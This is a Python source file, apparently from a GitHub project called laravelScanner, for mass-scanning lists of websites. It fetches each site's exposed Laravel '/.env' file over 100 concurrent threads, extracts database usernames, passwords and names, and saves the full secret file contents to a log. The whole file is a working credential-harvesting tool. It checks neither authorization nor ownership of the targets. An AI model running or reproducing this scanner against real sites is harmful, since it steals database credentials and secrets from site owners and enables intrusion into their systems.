#https://github.com/Ishanoshada/laravelScanner/
#By Ishan Oshada
# Import necessary modules
import argparse  # For parsing command-line arguments
import requests  # For making HTTP requests
import re  # For regular expressions
import os  # For interacting with the operating system
from multiprocessing.dummy import Pool as ThreadPool  # For concurrent processing

# Define a class for the LaravelScanner
class LaravelScanner:
    # Constructor method, initializes variables and gets URLs from file or manual input
    def __init__(self, file=None):
        self.totals = 0
        self.ListPass = self.get_urls_from_file(file) if file else self.get_urls_manually()

    # Static method to get URLs from a file
    @staticmethod
    def get_urls_from_file(file):
        return open(file, 'r').readlines()

    # Static method to get URLs manually from user input
    @staticmethod
    def get_urls_manually():
        # User interface for manual input with color codes
        print("\033[92m" + '*' * 80)
        print("\033[92m" + '*' + ' ' * 78 + '*')
        print("\033[92m*No file provided ( python main.py -f env.txt ) . Please enter URLs manually.:" + ' ' * 44 + '*')
        print("\033[92m*Type 'done' when finished.:" + ' ' * 64 + '*')
        print("\033[92m" + '*' + ' ' * 78 + '*')
        print("\033[92m" + '*' * 80 + "\033[0m")

        # Collect URLs from user input
        urls = []
        while True:
            url = input("\033[96m    Enter a URL: \033[0m")
            if url.lower() == 'done':
                break
            urls.append(url)
        return urls

    # Static method to create a formatted table for output
    @staticmethod
    def create_table(text):
        terminal_width = os.get_terminal_size().columns
        border = '*' * (terminal_width - 2)

        text_lines = text.split('\n')
        formatted_text = ''
        for line in text_lines:
            formatted_text += f"| {line.center(terminal_width - 4)} |\n"

        table = f"{border}\n{formatted_text}{border}"

        return table

    # Method to check a site for Laravel installation
    def check(self, site):
        try:
            site = site.strip()
            fdata = ""
            u = f"{site}/.env"
            op = requests.get(u, timeout=7)

            if 'DB_PASSWORD=' in op.text:
                # Print a message indicating Laravel found
                print(f"\n\033[31m\t Laravel found > {u}  ")
                dbuser = str(re.findall('DB_USERNAME=(.*)', op.text)[0]).split("''")[0]
                dbpass = str(re.findall('DB_PASSWORD=(.*)', op.text)[0]).split("''")[0]
                dbname = str(re.findall('DB_DATABASE=(.*)', op.text)[0]).split("''")[0]

                fdata += f"{'#'*50}\nURL : {u}\n{op.text} \n{'#'*50}\n###https://github.com/Ishanoshada/laravelScanner "
                self.totals += 1

                with open("envdata.log", "+a") as b:
                    b.write(str(fdata))

                    # Additional feature: Log database details
                    with open("envdata.log", "+a") as b:
                        b.write(str(fdata))
            else:
                pass

        except Exception as e:
            # Additional feature: Log exceptions
            with open("error.log", "+a") as err:
                err.write(f"Error for {site}: {str(e)}\n")

    # Method to initiate the scanning process
    def scan(self):
        os.system("clear")
        banner = """\033[92m
          _                           _    _____                                  
         | |                         | |  / ____|                                 
         | | __ _ _ __ __ ___   _____| | | (___   ___ __ _ _ __  _ __   ___ _ __  
         | |/ _` | '__/ _` \ \ / / _ \ |  \___ \ / __/ _` | '_ \| '_ \ / _ \ '__| 
         | | (_| | | | (_| |\ V /  __/ |  ____) | (_| (_| | | | | | | |  __/ |    
         |_|\__,_|_|  \__,_| \_/ \___|_| |_____/ \___\__,_|_| |_|_| |_|\___|_|    
                                                                              
                                                              by Ishan Oshada               
        """
        print(banner)

        # Create a thread pool for concurrent processing
        pool = ThreadPool(100)
        # Map the check function to the list of URLs
        pool.map(self.check, self.ListPass)
        pool.close()
        pool.join()

        # Display the total number of Laravel installations found
        if __name__ == '__main__':
            print(self.create_table(f"\n\t Total Laravel Founded : {self.totals}\n"))

# Main block for command-line execution
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Database scanner from .env laravel")
    parser.add_argument('-f', '--file', help='File containing list of URLs')
    args = parser.parse_args()

    # Create an instance of LaravelScanner with the provided file argument
    scanner = LaravelScanner(args.file)
    # Initiate the scanning process
    scanner.scan()
  
